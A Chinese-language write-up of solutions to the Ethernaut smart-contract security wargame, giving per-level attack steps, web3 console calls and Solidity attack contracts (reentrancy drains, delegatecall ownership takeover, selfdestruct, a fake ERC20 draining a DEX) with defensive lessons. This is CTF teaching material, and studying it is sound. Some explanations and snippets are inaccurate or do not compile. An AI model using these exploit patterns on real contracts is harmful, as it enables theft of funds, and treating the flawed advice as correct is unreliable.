# Ethernaut Solutions
## 项目介绍

[Ethernaut](https://ethernaut.openzeppelin.com/) 是 OpenZeppelin 开发的一个 Web3/Solidity 的游戏，通过闯关的方式来学习智能合约安全。每一关都是一个需要被攻破的智能合约，通过发现和利用合约中的漏洞来通过挑战。

## 难度：
- [Easy] - 基础概念和简单漏洞
- [Medium] - 需要理解合约机制和常见攻击方式
- [Hard] - 复杂的漏洞利用和高级概念

## 01. Fallback ✅ [Easy]

这关主要考察 fallback 函数的知识点：
- `receive()` 函数在合约接收 ETH 时被调用
- `fallback()` 函数在调用不存在的函数时被调用
- 通过发送少量 ETH 并调用 `contribute()` 函数来满足条件
- 最后通过 `receive()` 函数获取合约所有权

攻击步骤：
1. 调用 `contribute()` 并发送少量 ETH (<0.001)
```js
await contract.contribute({value: web3.utils.toWei('0.0001')});
```

2. 直接向合约发送 ETH 触发 `receive()`
```js
await contract.sendTransaction({value: web3.utils.toWei('0.0001')});
```

3. 调用 `withdraw()` 提取所有 ETH
```js
await contract.withdraw();
```

## 02. Fallout ✅ [Easy]

这关主要考察早期 Solidity 版本的构造函数问题：
- 老版本使用与合约同名的函数作为构造函数
- 如果函数名称与合约名不完全一致,就变成了普通函数
- 攻击者可以直接调用该函数获取所有权

攻击步骤：
1. 直接调用 `Fal1out()` 函数获得合约所有权
```js
await contract.Fal1out();
```

2. 调用 `collectAllocations()` 提取资金
```js
await contract.collectAllocations();
```

学习要点：
- 构造函数的安全性
- 代码审计的重要性
- 新版本使用 `constructor` 关键字更安全

## 03. Coin Flip ✅ [Medium]

这关主要考察区块链的随机数问题：
- 链上随机数可以被预测
- `block.number` 等区块信息是公开的
- 攻击者可以在同一区块复制计算逻辑

攻击步骤：
1. 部署攻击合约复制游戏合约的计算逻辑
2. 手动调用 `attackCoin()` 十次（每次等待新区块）
3. 确认胜利次数达到10次

> 注意：不能使用循环连续调用 `attackCoin()` 十次，因为每次猜测都需要在不同区块中进行。如果在同一个区块中多次调用，会使用相同的 `blockhash`，导致预测结果相同。

攻击合约代码：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attack {
    ICoinFlip public targetContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        targetContract = ICoinFlip(_targetAddress);
    }

    function attackCoin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
```

学习要点：
- 链上随机数的局限性
- 不应使用区块信息作为随机源
- 可以使用 Chainlink VRF 等预言机获取真随机数
- 理解区块链的时序性，每个区块的信息都是唯一的

## 04. Telephone ✅ [Easy]

这关主要考察对tx.origin的理解：
- tx.origin 是交易的发送者
- 攻击者可以利用 tx.origin 来欺骗合约，使其认为攻击者是合约的拥有者

攻击步骤：
1. 写一个攻击合约
2. 调用 `changeOwner()` 函数，将合约的 owner 设置为攻击者

学习要点：
- 理解 tx.origin 的局限性
- 使用 msg.sender 更安全

## 05. Token ✅ [Easy]

这关主要考察对solidity的漏洞的理解：
- 在 Solidity 0.6.x 及更早版本中，`transfer()` 和 `send()` 函数存在漏洞
- 在 Solidity 0.6.x 中，如果 balances[msg.sender] 小于 _value，balances[msg.sender] -= _value; 会发生 整数下溢（uint 从 0 减去 1 会变成 2^256 - 1）。
这会导致攻击者的余额变得非常大。
- 这些函数在处理错误时不会回滚交易，而是返回 false
- 攻击者可以利用这些漏洞进行重入攻击

攻击步骤：
1. 先查看自己的msg.sender的余额
2. 调用 `transfer()` 函数
```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```
3. 查看自己的余额，发现余额增加了

学习要点：
- 理解 Solidity 0.6.x 的整数下溢漏洞
- 使用更安全的函数和库(SafeMath或者自行添加溢出检查)

## 06. Delegation ✅ [Easy]

这关主要考察对delegatecall的理解：
- delegatecall 是低级调用，可以调用另一个合约的代码，delegatecall 是一种底层函数调用，它允许合约 A 执行合约 B 的代码，但使用 A 的存储上下文。换句话说，合约 B 的逻辑会影响合约 A 的状态。
- 攻击者可以利用 delegatecall 来调用合约的代码，从而获取合约的所有权

攻击步骤：
1. await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
web3.utils.sha3("pwn()") 会生成函数签名的哈希值
.slice(0,10) 取哈希值的前 4 字节（这是函数选择器）

学习要点：
- 在使用 delegatecall 时，必须确保被调用合约的逻辑与当前合约的存储布局一致，否则可能导致存储被意外覆盖。
- 实际开发中避免漏洞

- 避免在 fallback 函数中使用 delegatecall，除非有严格的访问控制。
- 使用现代的合约框架（如 OpenZeppelin 的 Proxy 合约）来实现代理逻辑。

## 07. Force ✅ [Medium]

这关主要考察对selfdestruct的理解：
- selfdestruct 是 Solidity 中的一个低级函数，用于销毁合约并将其所有余额发送给指定的目标地址。
- 攻击者可以利用 selfdestruct 来强制将合约的余额发送给目标地址

攻击步骤：
1. 部署一个新合约并向该合约发送以太币。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor() public payable {
        // 构造函数可接收以太币
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

2. 调用 `attack()` 函数，将合约的余额发送给目标地址
```js
// 调用攻击函数，强制发送以太币
await attackContract.attack(contract.address);
// 验证 Force 合约的余额
const balance = await web3.eth.getBalance(contract.address);
console.log("Force Contract Balance:", balance);
```

学习要点：
- 理解 selfdestruct 的机制
- 确保你的合约逻辑不依赖于余额为零的假设。
- 避免在代码中直接检查合约余额。

## 08. Vault ✅ [Easy]

这关主要考察对区块链的存储的理解：
- 区块链的存储是公开的，任何人都可以查看，哪怕存储是private的数据也可以查看
- 攻击者可以利用区块链的存储来获取合约的密码
- Solidity 中的所有状态变量都存储在合约的存储槽（Storage Slots）中。
- 公共变量（如 locked）可以直接通过合约接口读取。
- 私有变量（如 password）虽然标记为 private，但实际上只是在 Solidity 中不可直接通过合约代码访问。它们仍然可以通过低级的存储读取方法（如 web3.eth.getStorageAt）获取。

攻击步骤：
1. 使用 web3.eth.getStorageAt 读取存储槽 1 的内容（password 存储在存储槽 1）。
```js
await web3.eth.getStorageAt(contract.address, 1).toString();
```
2. 将读取到的密码作为参数调用 `unlock()` 函数。
```js
await contract.unlock(password);
```

学习要点：
- 理解 Solidity 中的存储布局
- 使用低级函数（如 web3.eth.getStorageAt）来访问私有变量
- 不要将敏感数据直接存储在链上，即使使用 private 关键字。
- 如果需要存储敏感数据，建议使用加密方式存储，并仅在必要时解密。

## 09. King ✅ [Easy]

这关主要考察对重入攻击特殊变体的理解了：
- 重入攻击是指攻击者利用合约的漏洞，在合约执行过程中多次调用某个函数，从而获取更多的利益。
- 攻击者可以利用重入攻击来获取合约的控制权

攻击步骤：
1. 如果当前国王是一个智能合约，而该合约的 receive 函数无法接收 ETH（或者故意导致交易失败），新的国王就无法成功调用 receive，从而阻止任何其他玩家成为新的国王。
2. 部署一个攻击合约，并通过攻击合约成为国王。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public payable {
        // 调用目标合约，并成为新的国王
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 故意让接收 ETH 的函数失败
    receive() external payable {
        revert("I refuse to give up the throne!");
    }
}
```

3. 部署攻击合约并提供足够的 ETH（大于当前的 prize）

学习要点：
- 理解receive函数的作用：在目标合约中，receive 函数是接收 ETH 的核心逻辑。如果接收方不能正确处理 ETH 转账，会导致交易失败。
- 防御建议：避免使用低级调用（如 call）进行转账，可以使用 transfer 或 send，它们在转账失败时会自动回滚。
- 在合约设计中，避免依赖外部合约的行为来完成核心逻辑。
- 使用现代的合约框架（如 OpenZeppelin 的 ReentrancyGuard）来实现安全重入控制

## 10. Re-entrancy ✅ [Medium]

这关主要考察对re-entrancy的理解：
- 重入攻击是指攻击者利用合约的漏洞，在合约执行过程中多次调用某个函数，从而获取更多的利益。
- 攻击者可以利用重入攻击来获取合约的控制权

攻击步骤：
1. 编写攻击合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public target;
    address public owner;

    constructor(address payable _target) public {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    // 调用目标合约的 donate 函数
    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    // 发起攻击
    function attack(uint256 _amount) public {
        target.withdraw(_amount);
    }

    // 重入逻辑
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    // 提取攻击合约中的以太币
    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
2. 调用 `donate()` 函数，将合约的余额发送给攻击合约
```js
await contract.donate{value: 1 ether}();
```
3. 调用 `attack()` 函数，发起攻击
```js
await attackContract.attack(1 ether);
```

学习要点：
- 理解 re-entrancy 的机制
- 使用现代的合约框架（如 OpenZeppelin 的 ReentrancyGuard）来实现安全重入控制

## 11. Elevator ✅ [Easy]

这关主要考察对interface的理解：
- interface 是 Solidity 中的一种抽象合约，用于定义合约的函数签名，但不包含实现代码。
- 攻击者可以利用实现 interface 的合约但是使用含有攻击的function来获取合约的控制权

攻击步骤：
1. 主要是实现了interface的攻击合约的编写
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator public target;
    bool public toggle;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle; // 切换返回值
        return toggle;
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }
}
```

学习要点：
- 限制接口调用者: 验证调用者是否为可信合约或特定地址。
- 使用 require 检查 msg.sender
```solidity
require(msg.sender == trustedAddress, "Unauthorized caller");
```
- 逻辑验证: 避免完全依赖外部合约的返回值，加入内部验证逻辑。


## 12. Privacy ✅ [Easy]

这个关卡主要考察对存储槽和数据保护的理解：
- 存储槽是 Solidity 中用于存储变量的空间，每个存储槽都有一个唯一的索引。
- 攻击者可以利用存储槽来获取合约的私有数据

攻击步骤：
1. 首先分析：Solidity 存储布局，状态变量按顺序存储在存储槽中：
locked 位于槽 0。
ID 位于槽 1。
flattening, denomination, 和 awkwardness 共用槽 2。
data 数组从槽 3 开始，分别存储 data[0], data[1], 和 data[2]。
尽管data 的存储内容是私有的（private），但在以太坊上，所有存储槽都是可通过低级工具（如 web3.eth.getStorageAt）读取的。
2. 使用 web3.eth.getStorageAt 读取存储槽 5 的内容
```js
await web3.eth.getStorageAt(contract.address, 5).toString();
```
3. 将读取到的 key 转换为 bytes16，然后调用 unlock 函数：
```js
await contract.unlock(key.slice(0, 34)); // 使用前 16 字节
```

学习要点：
- flattening, denomination, 和 awkwardness 共用槽 2：
  - 存储槽规则
  - 一个存储槽大小为 32 字节（256 位）。
  - 如果多个状态变量的总大小不超过 32 字节，它们会共用同一个槽。
  - 变量大小
  - flattening 是 uint8（1 字节）。 
  - denomination 是 uint8（1 字节）。
  - awkwardness 是 uint16（2 字节）。
  - 它们总共占用 1 + 1 + 2 = 4 字节，远小于 32 字节，因此 Solidity 将它们打包到同一个槽（槽 2）。
- 关于 key.slice(0, 34) 的原因
  - 在 JavaScript 中，web3.eth.getStorageAt 返回的是一个以太坊存储槽内容的十六进制字符串，类似于 0x 开头的 64 个字符（32 字节）。每两个字符表示 1 字节，因此：
  - key 的长度是 66 个字符（包括前缀 0x）。
  - 前 16 字节的十六进制表示需要 32 个字符（16 字节 * 2 个字符/字节）。
  - 加上 0x 的前缀，总共是 34 个字符。
  - 因此，key.slice(0, 34) 提取的就是前 16 字节的十六进制表示。

## 13. Gatekeeper One ✅ [Hard]

这个关卡主要考察对访问控制和位操作的理解：
- msg.sender 与 tx.origin 的区别
  - 在以太坊中：
    - msg.sender
      - 当前调用合约的直接调用者。
      - 在合约 A 调用合约 B 时，对于合约 B 来说，msg.sender 是合约 A 的地址。
    - tx.origin
      - 整个交易的起始调用者（通常是外部账户）。
      - 无论有多少层合约调用，tx.origin 始终是最初发起交易的外部账户地址。

攻击思路：
1. 让msg.sender不等于tx.origin，即：引入一个中间合约来攻击即可，这样msg.sender就是中间合约的地址，tx.origin就是外部账户的地址
2. 设计gateKey
GateKey 的设计原理，_gateKey 是一个 bytes8 类型的参数，目标是满足以下三个条件：

条件 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
将 _gateKey 转换为 64 位无符号整数后，取前 32 位和前 16 位，它们的值必须相同。
解释：
_gateKey 的高位 48 位必须为 0，这样前 32 位和前 16 位会完全相同。
例如：_gateKey = 0x000000000000ABCD。
条件 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
将 _gateKey 转换为 64 位无符号整数后，前 32 位和完整 64 位的值不能相同。
解释：
_gateKey 的低位 32 位不能全是 0，否则前 32 位和完整 64 位会相同。
例如：_gateKey = 0x00000000XXXXXXXX，其中 XXXXXXXX 不为 0。
条件 3: uint32(uint64(_gateKey)) == uint16(tx.origin)
_gateKey 的前 16 位必须等于你的外部账户地址的最后 2 字节。
解释：
tx.origin 是你的外部账户地址。
地址是 20 字节（160 位），最后 2 字节就是地址的低位 16 位。
```js
const txOrigin = web3.eth.defaultAccount; // 你的外部账户地址
const keyPart = txOrigin.slice(-4); // 获取地址最后 4 个字符（2 字节）
const gateKey = `0x000000000000${keyPart}`; // 构造 _gateKey
```
3. 设计攻击合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack(bytes8 _gateKey) public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = target.call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
```

学习要点：
- 理解 GateKey 的设计原理
- 使用 for 循环来反复攻击到gasleft() % 8191 == 0， call 函数进行重入攻击
- 了解 msg.sender 和 tx.origin 的区别

## 14. Gatekeeper Two ✅ [Hard]

这关主要考察对访问控制、位操作和内联汇编的理解：
- 内联汇编：内联汇编是 Solidity 中的一种低级语言，用于直接在 Solidity 代码中编写汇编代码。

攻击思路：
1. Gate Two中使用内联汇编 extcodesize 检查调用者地址的代码大小：
extcodesize(caller()) 获取调用者（msg.sender）地址的代码大小。
如果调用者是合约地址，extcodesize 会返回合约代码的大小。
要求 extcodesize 返回 0，说明调用者不能是一个已经部署好的合约。
也即：需要在构造函数中调用目标合约来攻击，合约的构造函数执行期间，extcodesize 返回 0，因为合约的代码还没有部署。

2. Gate Three就很简单，uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1。

3.设计攻击合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) public {
        // 计算 _gateKey
        unchecked {
            gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        }

        // 调用 enter 函数
        GatekeeperTwo(target).enter(gateKey);
    }
}
```

学习要点：
- 避免使用 extcodesize 判断调用者
extcodesize 的行为在合约构造期间容易被绕过。
- 改用更可靠的身份验证方式，比如签名验证。
- 限制调用者范围
验证调用者是否是预定义地址或经过授权的地址。
- 避免使用易预测的哈希值
不要依赖调用者地址或可预测的值作为访问条件。

## 15. Naught Coin ✅ [Medium]

没有新东西
提供两个思路：
第一种：使用ERC20的approve和transferfrom方法
第二种：利用modifier设计的缺陷，通过中间合约来调用逃过require的时间检测

## 16. Preservation ✅ [Medium]

这关主要考察对delegatecall的理解：
- delegatecall 是一种低级函数，用于在当前合约的上下文中执行另一个合约的代码。
- 攻击者可以利用 delegatecall 来执行目标合约的代码，从而获取目标合约的控制权。

攻击思路：
1. LibraryContract 的 storedTime 虽然在其定义中位于 Slot 0，但由于使用了 delegatecall，其逻辑实际上操作的是 Preservation 合约的 Slot 0，即 timeZone1Library。
2. 如果将 timeZone1Library 设置为攻击合约地址，可以通过 delegatecall 执行恶意合约逻辑，并直接修改 Slot 2（owner）。
3. 攻击合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibrary {
    // 保持存储布局与 Preservation 合约一致
    address public timeZone1Library; // Slot 0
    address public timeZone2Library; // Slot 1
    address public owner;            // Slot 2

    function setTime(uint256 _time) public {
        owner = address(uint160(_time)); // 将 uint256 转为地址并赋值给 owner
    }
}
```

学习要点：
- 理解 delegatecall 的工作原理
- 存储布局一致性在使用 delegatecall 时至关重要。
- 避免外部调用未受信任的合约地址。

## 17. Recovery ✅ [Medium]

这关考察的是通过区块链上公开的数据恢复丢失的合约和资金：
在 Ethereum 中，合约地址是通过以下公式计算的：address = keccak256(rlp.encode([sender, nonce]))[12:]
sender 是创建合约的地址。nonce 是该地址的交易计数。

思路：
找回地址即可：
```js
const recoveryAddress = "RECOVERY_CONTRACT_ADDRESS"; // 替换为实际地址
const nonce = 1; // Recovery 合约的 nonce，假设这是它的第一次部署
const tokenAddress = web3.utils.toChecksumAddress(
  "0x" + web3.utils.keccak256(web3.eth.abi.encodeParameters(
    ["address", "uint256"],
    [recoveryAddress, nonce]
  )).slice(26)
);

console.log("Token Address:", tokenAddress);
```

## 18. Magic Number ✅ [Easy]

这关考察的是极简合约的构造以及如何通过 EVM 字节码直接部署合约:
这个关卡的核心目标是部署一个符合以下条件的合约：

代码总长度不超过 10 字节。
返回任意有效的结果（不一定是 42）。
```assembly
PUSH1 0xff   // 推送值 255
PUSH1 0x00   // 返回数据的存储位置
RETURN
```

## 19. Alien Codex ✅ [Medium]

思路很简单：利用codex.length--使下标溢出然后ethereum会认为此时的codex分布在整个2^256-1的slot中（Ethereum 认为数组 codex 的元素范围扩展到整个存储的所有槽位 (0 ~ 2^256-1)）此时我们计算出slot0（Owner）的索引i，然后修改存储在slot的owner
实现很复杂：
```js
// 计算目标索引
const hash1 = web3.utils.keccak256(web3.eth.abi.encodeParameter("uint256", 1));
const targetIndex = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(hash1));
// 修改 slot 0
const attackerBytes32 = web3.utils.padLeft(attacker, 64); // 将攻击者地址转换为 bytes32
alienCodex.methods.revise(targetIndex.toString(), attackerBytes32).send({ from: attacker });
```

## 20. Denial ✅ [Easy]

很简单，还是使用call的漏洞，消耗大量gas就行，或者直接把钱全盗出来

## 21. Shop ✅ [Easy]

主要就是攻击者的逻辑：
```solidity
 function price() external view override returns (uint256) {
        // 根据 isSold 状态返回不同的价格
        return shop.isSold() ? 0 : 100;
    }
```

可能实际有变化，主要思想是：
- 避免调用外部合约的函数返回值来决定逻辑：
外部调用是不可控的，可能被恶意操纵。
- 使用 view 函数获取外部值后立即保存：
将外部函数的返回值保存到一个变量中，避免多次调用：

```solidity
uint256 currentPrice = _buyer.price();
if (currentPrice >= price && !isSold) {
    isSold = true;
    price = currentPrice;
}
```
- 严格验证逻辑：
使用内部逻辑或固定值来决定合约行为，而不是外部依赖。

## 22. Dex ✅ [Hard]

这个很有意思：
合约中代币价格的计算公式：uint256 swapAmount = (amount * toTokenBalance) / fromTokenBalance;
该公式是一个简单的比例计算，用于动态确定代币的兑换比例。理论上可以工作，但它完全依赖于当前的池子余额来计算价格。
当余额变化幅度较大（比如恶意用户操纵价格时），公式的输出就会大幅波动，导致价格失真。（容易出现1个Token1能换10个Token2的情况）那我来回倒腾就越赚越多。

缺乏保护机制：
没有滑点限制：滑点是代币价格波动的一个自然现象，但应该有一个限制，以避免因一次交易导致极端的价格变化。
缺乏最小价格检查：合约允许攻击者利用逐步减少余额的方式，导致一种代币价格变得极低甚至为零，从而耗尽流动性池。

这个漏洞暴露的问题是去中心化交易所需要更复杂的机制来保护池子的稳定性。解决方法是：  
- 使用 恒定乘积公式 确保价格平稳。
- 添加滑点保护和最小流动性限制。
- 避免直接依赖外部用户行为决定合约逻辑。
- 考虑手续费模型减少恶意行为的收益。


## 23. Dex Two ✅ [Hard]

这个对比dex1就是少了require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");限制
那就可以注入一个攻击Token只要是实现了ERC20就行，那就可以添加攻击transfer了
```solidity
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MTK") {}

    function balanceOf(address account) public view override returns (uint256) {
        return 1e18; // 固定返回高余额
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        return true; // 强制转账成功
    }
}

// 攻击合约
contract AttackDexTwo {
    DexTwo public dex;
    MaliciousToken public token;

    constructor(address _dex) {
        dex = DexTwo(_dex);
        token = new MaliciousToken();
    }

    function exploit() public {
        // 向 DexTwo 中添加恶意代币流动性
        dex.add_liquidity(address(token), 1); // 添加1个恶意代币

        // 利用恶意代币的高余额操控价格
        dex.swap(address(token), dex.token1(), 1);
        dex.swap(address(token), dex.token2(), 1);

        // 此时，DexTwo 的 token1 和 token2 已被耗尽
    }
}
```

## 24. Puzzle Wallet ✅ [Hard]

这题有两个问题：
1. 如何成为upgradeable合约的管理员
因为UpgradeableProxy 中使用的delegatecall，admin所在的slot和puzzlewallet的max_balance所在的slot是同一个slot，所以可以通过调用来把admin改成自己并把自己加到whitelist里

2. 怎么多次调用deposit
在multicall里的deposit 的限制是 “只能调用一次”，但是没有限制multicall不能调用自己本身，可以将 multicall 调用嵌套在另一个 multicall 中，例如：
multicall([
  multicall([deposit])
])
在外层 multicall 中，depositCalled 变量重置为 false。内层调用的 multicall 会调用 deposit，然后再次嵌套，绕过了布尔变量的限制。

## 25. Motorbike ✅ [Hard]

重点在于理解：
delegatecall的过程，还有代理合约和逻辑合约

代理合约 (moto) 是存储变量的地方：
代理合约用来保存所有状态变量，例如 initialized，这些变量的值实际存储在代理合约的存储槽中。
当通过代理合约调用 engine 的 initialize 方法时，delegatecall 的作用是让 initialize 在代理合约的存储上下文中运行，因此会在代理合约的存储槽里设置 initialized = true。

逻辑合约 (engine) 只提供代码：
逻辑合约本身并不存储变量，它只定义了变量的布局和逻辑。
如果直接调用逻辑合约的方法，例如 engine.initialize()，存储变量 initialized 对逻辑合约来说始终是未初始化的默认值（false），因为它并没有独立的存储。
因此，每次直接调用 engine 的方法，initialized = true 都相当于一个临时变量的更改，不会被保存下来。

```solidity
fallback() external payable {
    assembly {
        // 1. 复制 calldata 到内存
        calldatacopy(0, 0, calldatasize())

        // 2. 使用 delegatecall 调用逻辑合约
        let result := delegatecall(
            gas(),                  // 转发所有剩余 gas
            sload(implementation.slot), // 加载逻辑合约地址
            0,                      // 输入数据起始地址
            calldatasize(),         // 输入数据大小
            0,                      // 输出数据起始地址
            0                       // 输出数据大小
        )

        // 3. 将返回数据复制到内存
        returndatacopy(0, 0, returndatasize())

        // 4. 根据调用结果返回或回滚
        switch result
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}
```

然后创建自定义合约以执行 selfdestruct
部署一个恶意合约，使用 selfdestruct 摧毁逻辑合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Destroyer {
    function destroy(address payable target) external {
        selfdestruct(target);
    }
}
```

调用 destroy 函数，目标是逻辑合约地址：
```javascript
await destroyerContract.methods.destroy(logicAddress).send({ from: player });
```

## 26. DoubleEntryPoint ✅[Easy]

直接中间合约调用sweepToken(LGT)就完了，修复的话
```solidity
function sweepToken(IERC20 token) external onlyOwner {
    require(address(token) != address(det), "Can't sweep DET tokens");
    require(address(token) != address(legacyToken), "Can't sweep LegacyToken");
    token.transfer(owner(), token.balanceOf(address(this)));
}
```

## 27. Good Samaritan ✅[Easy]

这题直接找到Inotify发现这个可以利用，然后还有个点就是利用
```solidity
catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                ...
            }
        }
```
这里直接捕获到对应的错误就把剩余的代币全转了，而且转之前也不看看是不是真的amount<10了，所以可以利用前一个实现notify的时候返回对应的err( revert("NotEnoughBalance()");)，然后就可以把剩余的代币全转了

## 28. Gatekeeper Three ✅[Medium]

思路：
- 调用 construct0r 将 owner 设置为你的地址。
- 调用 createTrick 创建 SimpleTrick 实例。
- 找到 SimpleTrick 合约的 password。
- 调用 getAllowance(password) 将 allowEntrance 设置为 true。
- 确保合约余额大于 0.001 ether，并将 owner 地址设置为无法接收以太币的合约。
- 通过代理合约调用 enter 函数，绕过 gateOne 检查。
- 成功设置 entrant。

## 29. Switch ✅[Easy]

我的思路是直接调用flipSwitch，传入的参数是把bytes4(keccak256("turnSwitchOff()"))放在低次位的四个字节上
```solidity
function attack() public {
        // 构造 _data：
        // 前 4 字节是 turnSwitchOn 的选择器
        // 第 68-72 字节是 turnSwitchOff 的选择器
        bytes memory data = abi.encodeWithSelector(
            target.turnSwitchOn.selector // 实际调用 turnSwitchOn
        );

        // 在第 68-72 字节插入 turnSwitchOff 的选择器
        assembly {
            mstore(add(data, 0x44), shl(224, 0x9c60e39d)) // turnSwitchOff selector
        }

        // 调用 flipSwitch，触发目标逻辑
        target.flipSwitch(data);
}
```

## 30. HigherOrder ✅[Hard]

这关主要考察calldata的理解，在 Solidity 中，calldata 是函数调用时发送给合约的一段原始数据，包含以下结构：
函数选择器（前 4 字节）：决定调用哪个函数。
参数数据：紧跟选择器之后，包含函数的输入参数。
例如，对于 registerTreasury(uint8)，正常的 calldata 结构是：

[ 函数选择器 (4字节) ][ 参数 (32字节，实际是 uint8 范围内的值) ]

但由于 assembly 直接读取了第 4 字节以后的 32 字节 数据，整个参数范围被扩大了。可以通过手动构造 calldata 来传递超过 uint8 范围的值。

```solidity
// 手动发送 calldata，绕过 uint8 限制
bytes memory payload = abi.encodeWithSignature("registerTreasury(uint8)", uint256(256));
(bool success, ) = address(target).call(payload);
require(success, "Failed to register treasury");
```

## 31. Stake ✅[Medium]

思路:
攻击StakeWETH，因为WETH可以自己实现，并且这里的call直接去执行WETH的approve方法和transferfrom方法，我可以满足它的检测bytesToUint满足，然后不转入，但是还是加了amount，所以我可以满足题意

## 32. impersonator ✅[Hard]

思路：
这个看了很久，首先确定ecrecover 是以太坊内置函数，用于从签名中恢复签名者的地址。
note：它的主要用途是验证一条消息是否由某个以太坊地址持有的私钥签名。通过 ecrecover，我们可以验证签名者的身份，而不需要直接访问私钥。
然后确定除了lock的constructor部分外其他都没啥问题，于是仔细研究constructor
```solidity
bytes32 _msgHash;
assembly {
    mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
    mstore(0x1C, _lockId) // 32 bytes
    _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
}
msgHash = _msgHash;
``` 
生成一个哈希值（msgHash），用作签名验证的基础。将固定前缀 "\x19Ethereum Signed Message:\n32" 存入内存起始位置 0x00。这是以太坊的 EIP-191 标准，要求在签名前加前缀，防止重放攻击。
```solidity
address initialController = address(1);
assembly {
    let ptr := mload(0x40)
    mstore(ptr, _msgHash) // 32 bytes
    mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
    mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
    mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
    pop(
        staticcall(
            gas(), // Amount of gas left for the transaction.
            initialController, // Address of `ecrecover`.
            ptr, // Start of input.
            0x80, // Size of input.
            0x00, // Start of output.
            0x20 // Size of output.
        )
    )
    if iszero(returndatasize()) {
        mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
        revert(0x1c, 0x04)
    }
    initialController := mload(0x00)
    mstore(0x40, add(ptr, 128))
}
``` 
从 _signature 中恢复签名者地址，作为初始控制器（initialController）staticcall
尝试调用 ecrecover 合约，恢复签名者地址。
错误：这里错误地将 initialController（address(1)）作为调用目标地址，而 ecrecover 是内置函数，根本不需要合约地址。
修复：
```solidity
// Recover the address from the signature
    (bytes32 r, bytes32 s, uint8 v) = abi.decode(_signature, (bytes32, bytes32, uint8));
    address initialController = ecrecover(msgHash, v, r, s);
    require(initialController != address(0), "Invalid signature");

// Prevent signature reuse
bytes32 signatureHash = keccak256(_signature);
require(!usedSignatures[signatureHash], "Signature already used");
usedSignatures[signatureHash] = true;
```

## 33. Magic Animal Carousel ✅[Medium]

没有想象的第一眼难，只要看懂
carousel 是一个 mapping(uint256 => uint256)，表示木马的每个 "箱子" 的状态：
高 80 位 (ANIMAL_MASK)：存储动物名字的编码。
中间 16 位 (NEXT_ID_MASK)：存储下一个箱子的 ID。
低 160 位 (OWNER_MASK)：存储当前箱子的拥有者地址。
就很简单，设计也很精妙，因为加起来刚好256位，所以可以完美存储（EVM执行每条指令256位）
隐藏难点在于输入进去的animal名字其实不能超过10个字节，但是限制是12个字节

[Continue with remaining challenges...]

## 学到的最佳实践

1. **智能合约安全**
   - 始终验证外部调用
   - 使用安全的随机数来源
   - 实施适当的访问控制

2. **代码设计**
   - 遵循标准模式
   - 使用现代 Solidity 特性
   - 保持代码结构清晰

3. **测试**
   - 编写全面的测试
   - 考虑边界情况
   - 针对安全漏洞进行测试

## 参考资料
- [Ethernaut](https://ethernaut.openzeppelin.com/)
- [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [如何成为智能合约审计员](https://cmichel.io/how-to-become-a-smart-contract-auditor/)
- [Cmichel 的解答](https://cmichel.io/ethernaut-solutions/)